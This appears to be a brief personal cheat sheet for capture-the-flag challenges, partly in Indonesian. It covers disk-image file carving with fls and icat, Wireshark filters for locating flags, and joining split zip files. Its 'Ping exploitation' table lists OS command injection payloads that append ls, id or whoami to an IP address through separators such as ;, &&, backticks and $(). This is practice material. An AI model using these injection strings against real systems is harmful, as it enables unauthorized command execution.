# Cara mount detail
fls -r -o 360448 disk.flag.img | grep -Ei "flag|txt|secret|hidden"
icat -o 360448 disk.flag.img 1234

# Network Forensic (wireshark)
1. tcp.stream eq 5
2. tcp contains "pico"

# Ping exploitation

| notasi | syntax |
|--------|--------|
| ; | 1.1.1.1; ls |
|&| 1.1.1.1 & ls|
|&&| 1.1.1.1 && ls|
|``| (masih gacha) 8.8.8.8`ls` |
|$|(masih gacha) 8.8.8.8$(id) OR ping $(whoami)|
| (double pipe) | 1.1.1.1 (double pipe) ls |
| (single pipe) | 1.1.1.1 (single pipe) ls |

# Mempersatukan pecahan-zip
cat part_1 part_2 > archive.zip
